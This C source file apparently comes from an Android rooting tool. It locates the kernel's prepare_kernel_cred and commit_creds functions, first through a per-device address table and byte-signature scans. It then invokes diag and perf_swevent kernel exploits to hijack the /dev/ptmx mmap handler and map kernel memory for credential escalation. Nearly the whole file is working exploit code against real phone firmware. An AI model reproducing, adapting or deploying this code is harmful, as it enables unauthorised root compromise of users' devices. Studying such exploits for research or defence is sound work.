#include <errno.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"
#include "libperf_event_exploit/perf_event.h"
#include "device_database/device_database.h"

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int prepare_kernel_cred_address;
  unsigned long int commit_creds_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_IS17SH_01_00_04,   0xc01c66a8, 0xc01c5fd8 },
  { DEVICE_SH04E_01_00_02,    0xc008d86c, 0xc008d398 },
  { DEVICE_SH04E_01_00_03,    0xc008d99c, 0xc008d4c8 },
  { DEVICE_SO01E_9_1_C_0_473, 0xc009843c, 0xc0097f60 },
  { DEVICE_SOL21_9_1_D_0_395, 0xc0098584, 0xc00980a8 },
  { DEVICE_HTL21_1_29_970_1,  0xc00ab9d8, 0xc00ab4c4 },
  { DEVICE_HTL22_1_05_970_1,  0xc00b2688, 0xc00b2174 },
  { DEVICE_HTL22_1_07_970_4,  0xc00b26a0, 0xc00b218c },
  { DEVICE_HTX21_1_20_971_1,  0xc00a6e54, 0xc00a6940 },
  { DEVICE_LT26W_1265_3909_6_2_B_0_200, 0xc00b261c, 0xc00b2140 },
  { DEVICE_LT26I_1257_8080_6_2_B_0_211, 0xc00b19d8, 0xc00b14fc },
  { DEVICE_C6603_1269_5309_10_1_1_A_1_307, 0xc0093dd4, 0xc00938f8 },
  { DEVICE_C6603_1275_1562_10_1_1_A_1_253, 0xc0093dd4, 0xc00938f8 },
  { DEVICE_C5302_1272_1092_12_0_A_1_284, 0xc009ec08, 0xc009e72c },
  { DEVICE_N05E_A1000311,     0xc0094430, 0xc0093ebc },
  { DEVICE_LG_E975,			  0xc00a0f90, 0xc00a0b6c }
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  int i;
  device_id_t device_id;

  device_id = detect_device();

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id){
      if (prepare_kernel_cred_address) {
        *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
      }
      if (commit_creds_address) {
        *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
      }
      return true;
    }
  }

  print_reason_device_not_supported();

  return false;
}

static uint32_t PAGE_OFFSET = 0xC0000000;

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

#define KERNEL_SIZE 0x10000000

static bool
find_creds_functions_with_mmap(void *user_data)
{
  int fd;
  void *address;
  void *start_address = (void*) 0x10000000;

  fd = open(PTMX_DEVICE, O_RDWR);
  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred(address, KERNEL_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, KERNEL_SIZE);

    prepare_kernel_cred = convert_to_kernel_address(prepare_kernel_cred, address);
    commit_creds = convert_to_kernel_address(commit_creds, address);
  }

  munmap(address, KERNEL_SIZE);

  close(fd);

  return prepare_kernel_cred && commit_creds;
}

static bool
find_with_diag_exploit(unsigned int ptmx_mmap_address)
{
  struct diag_values injection_data;

  injection_data.address = ptmx_mmap_address;
  injection_data.value = (uint16_t)&ptmx_mmap;

  return diag_run_exploit(&injection_data, 1,
                          find_creds_functions_with_mmap, NULL);
}

static bool
find_with_perf_swevent_exploit(unsigned int ptmx_mmap_address)
{
  return perf_swevent_run_exploit(ptmx_mmap_address, (int)&ptmx_mmap,
                                  find_creds_functions_with_mmap, NULL);
}

static bool
find_creds_functions_in_memory(void)
{
  unsigned long int ptmx_mmap_address;

  ptmx_mmap_address = get_ptmx_fops_address() + 0x28;

  if (diag_is_supported()) {
    return find_with_diag_exploit(ptmx_mmap_address);
  }
  return find_with_perf_swevent_exploit(ptmx_mmap_address);
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds)) {
    return true;
  }

  return find_creds_functions_in_memory();
}

